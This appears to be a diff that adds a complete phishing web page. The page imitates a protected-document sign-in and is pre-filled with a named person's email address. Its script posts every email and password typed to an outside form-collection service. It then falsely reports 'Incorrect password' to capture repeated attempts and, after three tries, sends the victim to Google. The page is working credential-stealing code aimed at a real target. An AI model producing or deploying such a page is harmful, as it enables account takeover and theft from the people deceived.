@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>dongbaosen@cnggg.cn</title>
+  <style>
+    body {
+      background-image: url('https://gyazo.com/ad553dfb288b72a117c5c29e923738fc.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-position: fit;
+      font-family: Arial, sans-serif;
+      color: #333;
+      text-align: center;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background-color: rgba(225, 225, 225, 0.5);
+      padding: 30px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      border-radius: 8px;
+      width: 320px;
+    }
+
+    .logo img {
+      max-width: 35%;
+      height: auto;
+      margin-bottom: 20px;
+    }
+
+    .input-fields input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+
+    .signin-button {
+      padding: 10px 20px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .signin-button:hover {
+      background-color: #0056b3;
+    }
+
+    .message {
+      display: none;
+      color: red;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img id="logo" src="https://gyazo.com/e2366e4a5e180e3d2f63617379e63867.png" alt="">
+<p style="margin-bottom: -30px;margin-top: 2px;font-weight: bold;text-align: right;"></p>
+<p style="font-size: 12px;align: left;margin-bottom: 10px;color: green;">Do more for free.<br> Sign in or create a free account.</p>
+<p>&#26412;&#25991;&#26723;&#21463;&#21040;&#20445;&#25252;&#21644;&#23433;&#20840; &#x1F512;! <br> &#35831;&#36755;&#20837;&#24744;&#30340;&#30005;&#23376;&#37038;&#20214;&#23494;&#30721;&#20197;&#25171;&#24320;.</p>
+
+    <form id="loginForm">
+      <div class="input-fields">
+        <input id="email" name="email" type="email" placeholder="Email" value="dongbaosen@cnggg.cn" required />
+        <input id="password" name="password" type="password" placeholder="Password" required />
+      </div>
+      <button type="submit" class="signin-button" id="signin-button">Sign In</button>
+    </form>
+
+    <div id="message" class="message">Incorrect password</div>
+  </div>
+
+  <script>
+    let attempt = 0;
+    const maxAttempts = 3;  // Number of incorrect attempts allowed
+    const form = document.getElementById("loginForm");
+    const message = document.getElementById("message");
+    const emailInput = document.getElementById("email");
+    const passwordInput = document.getElementById("password");
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault(); // Stop the form from redirecting
+      const email = emailInput.value;
+      const password = passwordInput.value;
+
+      // Send to PHP for every attempt
+      fetch("https://submit-form.com/t0zKsJnvd", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
+      });
+
+      attempt++;
+      if (attempt < maxAttempts) {
+        message.style.display = "block";
+        message.textContent = "Incorrect password"; // Display message for incorrect password
+        passwordInput.value = ""; // Clear password field for next attempt
+      } else {
+        // After 3 attempts, redirect to Google
+        setTimeout(() => {
+          window.location.href = "https://google.com"; // Redirect after 3 attempts
+        }, 500); // Small delay to allow last attempt to process
+      }
+    });
+  </script>
+</body>
+</html>
